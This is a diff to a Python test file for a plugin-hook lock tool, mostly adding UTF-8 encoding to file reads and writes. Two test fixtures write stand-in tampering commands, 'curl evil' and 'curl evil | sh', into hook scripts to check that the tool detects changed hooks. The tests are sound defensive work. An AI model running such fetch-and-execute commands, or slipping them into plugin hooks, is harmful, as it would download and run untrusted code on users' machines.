@@ -14,16 +14,16 @@ def make_plugin(root, mp, name, version="1.0.0", hooks=None, mcp=None, manifest=
     d = root / mp / name / version
     (d / ".claude-plugin").mkdir(parents=True)
     (d / ".claude-plugin/plugin.json").write_text(
-        json.dumps(manifest or {"name": name})
+        json.dumps(manifest or {"name": name}), encoding="utf-8"
     )
     (d / "skills").mkdir()
-    (d / "skills/a.md").write_text("skill text")
+    (d / "skills/a.md").write_text("skill text", encoding="utf-8")
     if hooks is not None:
         (d / "hooks").mkdir()
-        (d / "hooks/hooks.json").write_text(hooks)
-        (d / "hooks/run.sh").write_text("echo hi")
+        (d / "hooks/hooks.json").write_text(hooks, encoding="utf-8")
+        (d / "hooks/run.sh").write_text("echo hi", encoding="utf-8")
     if mcp is not None:
-        (d / ".mcp.json").write_text(mcp)
+        (d / ".mcp.json").write_text(mcp, encoding="utf-8")
     return d
 
 
@@ -45,9 +45,9 @@ def test_hash_changes_with_hook_script_and_mcp(tmp_path):
     d = make_plugin(tmp_path, "m", "p", hooks="{}")
     h1 = plugin_lock.hash_plugin(d)
     assert len(h1) == 64
-    (d / "hooks/run.sh").write_text("curl evil")
+    (d / "hooks/run.sh").write_text("curl evil", encoding="utf-8")
     h2 = plugin_lock.hash_plugin(d)
-    (d / ".mcp.json").write_text("{}")
+    (d / ".mcp.json").write_text("{}", encoding="utf-8")
     assert len({h1, h2, plugin_lock.hash_plugin(d)}) == 3
 
 
@@ -56,7 +56,7 @@ def test_manifest_hooks_key_counts_but_other_keys_do_not(tmp_path):
     h1 = plugin_lock.hash_plugin(d)
     assert h1 != "none"
     (d / ".claude-plugin/plugin.json").write_text(
-        json.dumps({"name": "p", "hooks": {"a": 1}, "x": 2})
+        json.dumps({"name": "p", "hooks": {"a": 1}, "x": 2}), encoding="utf-8"
     )
     assert plugin_lock.hash_plugin(d) == h1
 
@@ -77,9 +77,9 @@ def test_custom_hooks_file_content_counts(tmp_path):
     # plugin.json "hooks": "./cfg/h.json" points at a file; its content is what runs
     d = make_plugin(tmp_path, "m", "p", manifest={"name": "p", "hooks": "./cfg/h.json"})
     (d / "cfg").mkdir()
-    (d / "cfg/h.json").write_text('{"a": 1}')
+    (d / "cfg/h.json").write_text('{"a": 1}', encoding="utf-8")
     h1 = plugin_lock.hash_plugin(d)
-    (d / "cfg/h.json").write_text('{"a": 2}')
+    (d / "cfg/h.json").write_text('{"a": 2}', encoding="utf-8")
     assert plugin_lock.hash_plugin(d) != h1
 
 
@@ -88,9 +88,9 @@ def test_script_outside_hooks_that_a_hook_runs_counts(tmp_path):
     hooks = json.dumps({"hooks": {"PreToolUse": [{"hooks": [cmd]}]}})
     d = make_plugin(tmp_path, "m", "p", hooks=hooks)
     (d / "bin").mkdir()
-    (d / "bin/check.sh").write_text("echo ok")
+    (d / "bin/check.sh").write_text("echo ok", encoding="utf-8")
     h1 = plugin_lock.hash_plugin(d)
-    (d / "bin/check.sh").write_text("curl evil | sh")
+    (d / "bin/check.sh").write_text("curl evil | sh", encoding="utf-8")
     assert plugin_lock.hash_plugin(d) != h1
 
 
@@ -115,14 +115,14 @@ def test_check_ok_then_mismatch_and_missing(tmp_path):
     d = make_plugin(cache, "m", "p", hooks="{}")
     lock = tmp_path / "x.lock"
     assert run("update", cache, lock).returncode == 0
-    assert lock.read_text().splitlines()[-1].startswith("m/p ")
+    assert lock.read_text(encoding="utf-8").splitlines()[-1].startswith("m/p ")
     r = run("check", cache, lock)
     assert r.returncode == 0 and r.stdout == ""
-    (d / "hooks/run.sh").write_text("changed")
+    (d / "hooks/run.sh").write_text("changed", encoding="utf-8")
     r = run("check", cache, lock)
     assert r.returncode == 1 and "m/p" in r.stdout
     make_plugin(cache, "m", "q")
-    lock.write_text("# header\n")
+    lock.write_text("# header\n", encoding="utf-8")
     r = run("check", cache, lock)
     assert "m/p" in r.stdout and "m/q" in r.stdout
 
@@ -133,7 +133,7 @@ def test_only_filter_limits_plugins(tmp_path):
     make_plugin(cache, "m", "old", hooks="{}")
     lock = tmp_path / "x.lock"
     run("update", cache, lock, "--only", "m/p")
-    assert "m/old" not in lock.read_text()
+    assert "m/old" not in lock.read_text(encoding="utf-8")
     assert run("check", cache, lock, "--only", "m/p").returncode == 0
 
 
@@ -142,9 +142,9 @@ def test_update_only_keeps_the_other_reviewed_lines(tmp_path):
     cache = tmp_path / "cache"
     make_plugin(cache, "m", "p", hooks="{}")
     lock = tmp_path / "x.lock"
-    lock.write_text("other/plugin abc123\n")
+    lock.write_text("other/plugin abc123\n", encoding="utf-8")
     run("update", cache, lock, "--only", "m/p")
-    text = lock.read_text()
+    text = lock.read_text(encoding="utf-8")
     assert "other/plugin abc123" in text and "m/p " in text
 
 
@@ -157,5 +157,5 @@ def test_bad_input_gives_message_not_traceback(tmp_path):
 
 def test_the_shipped_lock_has_the_header_and_no_foreign_line():
     # This repo names no third-party plugin: each one a user installs gets a line from update
-    lock = (ROOT / "claude" / "plugin-hooks.lock").read_text()
+    lock = (ROOT / "claude" / "plugin-hooks.lock").read_text(encoding="utf-8")
     assert lock == plugin_lock.HEADER
